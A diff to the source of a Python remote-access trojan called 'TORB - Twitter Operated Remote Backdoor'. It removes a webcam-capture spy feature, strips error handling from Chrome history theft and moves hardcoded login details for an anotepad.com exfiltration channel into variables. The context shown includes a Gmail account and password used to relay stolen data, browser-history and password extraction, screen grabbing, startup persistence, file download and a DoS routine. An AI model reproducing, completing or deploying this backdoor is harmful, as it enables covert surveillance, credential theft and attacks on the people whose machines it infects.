@@ -68,7 +68,6 @@ from random import randint
 import random
 import time
 import string
-import cv2
 
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -90,7 +89,9 @@ gmail_user = 'pyhannahmaple@gmail.com'
 gmail_password = 'sweetiepie246'
 # Gmail - Receiving Address (Client)
 to = ['elliotarigato@gmail.com']
-# Configure anotepad.com backup bot on line 394 (optional)
+# anotepad.com - backup output bot authentication details
+anotepadUser = 'pyhannahmaple@gmail.com'
+anotepadPass = 'xgtfVBZV5Ed9eLFd'
 ##############################################
 
 print "\nTORB - Twitter Operated Remote Backdoor (Public Edition)\n"
@@ -185,14 +186,9 @@ def main():
 				q = z
 			# Extract Chrome Browser History
 			elif z == "history":
-				print "Extracting Chrome History..."
-				try:
-					EPE_Main()
-					chromeFug()
-					analyze(sites_count_sorted)
-				except:
-					print "History Extraction Failed."
-					relayMe("TORB was unable to extract history. Possible UAC restriction.")
+				EPE_Main()
+				chromeFug()
+				analyze(sites_count_sorted)
 				q = z
 			elif z == "screengrab":
 				print "Capturing Screen"
@@ -264,15 +260,6 @@ def main():
 				print "Embedding to startup..."
 				storeStart()
 				q = z
-			# Activate web camera and save screenshot
-			elif z == "webcamview":
-				try:
-					print "Capturing web cam screenshot..."
-					webcam_Capture()
-				except:
-					print "Webcam not found"
-					relayMe("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
-				q = z
 			# Put server to rest / Stop all commands
 			elif z == "sleep":
 				print "Entering sleep state..."
@@ -309,14 +296,9 @@ def main():
 					comm_backup("TORB was unable to extract passwords. Possible UAC restriction.")
 				q = z
 			elif z == "history":
-				print "Extracting Chrome History"
-				try:
-					EPE_Main()
-					chromeFug()
-					analyze(sites_count_sorted)
-				except:
-					print "History Extraction Failed."
-					comm_backup("TORB was unable to extract history. Possible UAC restriction.")
+				EPE_Main()
+				chromeFug()
+				analyze(sites_count_sorted)
 				q = z
 			elif z == "screengrab":
 				print "Capturing Screen"
@@ -391,15 +373,6 @@ def main():
 			elif z == "startup":
 				print "Embedding to startup..."
 				storeStart()
-				q = z
-			# Activate web camera and save screenshot
-			elif z == "webcamview":
-				try:
-					print "Capturing web cam screenshot..."
-					webcam_Capture()
-				except:
-					print "Webcam not found"
-					comm_backup("Web Cam Screenshot Error\n\nWeb cam not found on this machine...")
 				q = z
 			# Put server to rest / Stop all commands
 			elif z == "sleep":
@@ -498,8 +471,8 @@ def comm_backup(subjNote):
 		login_data = \
 		{
 			'action': 'login',
-			'email': 'pyhannahmaple@gmail.com',
-			'password': 'xgtfVBZV5Ed9eLFd',
+			'email': anotepadUser,
+			'password': anotepadPass,
 			'submit':'' 
 		}
 
@@ -948,20 +921,6 @@ def torbDoS(ddsHost):
     print "%s : %s" % (xdd,ydd)
     run(xdd,ydd)
 
-# This feature is unfinished....
-# Wecam capture under-construction
-def webcam_Capture():
-	cap = cv2.VideoCapture(0)
-
-	ret, frame = cap.read()
-	rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)
-
-	cv2.imshow('frame', rgb)
-	out = cv2.imwrite('wc_capture.jpg', frame)
-
-	cap.release()
-	cv2.destroyAllWindows()
-
 cmdList = """
 [Fun]:
 	msg [message] - Display Windows Message
@@ -978,7 +937,6 @@ cmdList = """
 	scandir [dir] - Scan Directory
 	read [dir] - Read File Content
 	download [dir] - Download File
-	webcamview - Take Web Cam Screenshot (un-finished)
 	startup - Embed to Startup
 
 [Destructive]:
